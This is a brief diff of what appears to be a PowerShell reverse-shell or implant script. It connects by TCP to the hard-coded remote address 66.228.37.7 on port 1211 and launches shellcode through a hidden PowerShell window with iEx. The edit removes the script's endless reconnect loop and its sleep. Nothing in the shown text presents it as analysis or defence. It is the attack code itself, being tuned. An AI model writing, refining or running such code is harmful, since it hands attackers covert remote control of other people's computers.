@@ -1,4 +1,3 @@
-while ($true) {
 $Client = New-Object System.Net.Sockets.TcpClient("66.228.37.7", 1211)
 $Stream = $Client.GetStream()
 $Writer = New-Object System.IO.StreamWriter($Stream)
@@ -67,5 +66,3 @@ iEx "start powershell -windowstyle hidden -Args '$shellcode'"
 $StreamReader.Close()
 $Stream.Close()
 $Client.Close()
-Start-Sleep -Seconds 30
-}
